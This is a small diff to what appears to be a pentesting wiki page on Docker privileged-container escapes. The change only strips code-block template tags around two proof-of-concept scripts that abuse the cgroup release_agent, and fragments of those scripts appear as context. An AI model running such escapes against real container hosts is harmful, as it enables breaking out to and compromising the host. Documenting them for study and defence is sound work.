@@ -169,7 +169,7 @@ debugfs /dev/sda1
 
 #### Privileged Escape Abusing release\_agent - PoC1
 
-{% code title="Initial PoC" %}
+
 ```bash
 # spawn a new container to exploit via:
 # docker run --rm -it --privileged ubuntu bash
@@ -203,11 +203,11 @@ sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
 # Reads the output
 cat /o
 ```
-{% endcode %}
+
 
 #### Privileged Escape Abusing release\_agent - PoC2
 
-{% code title="Second PoC" %}
+
 ```bash
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
@@ -249,7 +249,7 @@ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 # Reads the output
 cat /output
 ```
-{% endcode %}
+
 
 Find an **explanation of the technique** in:
 
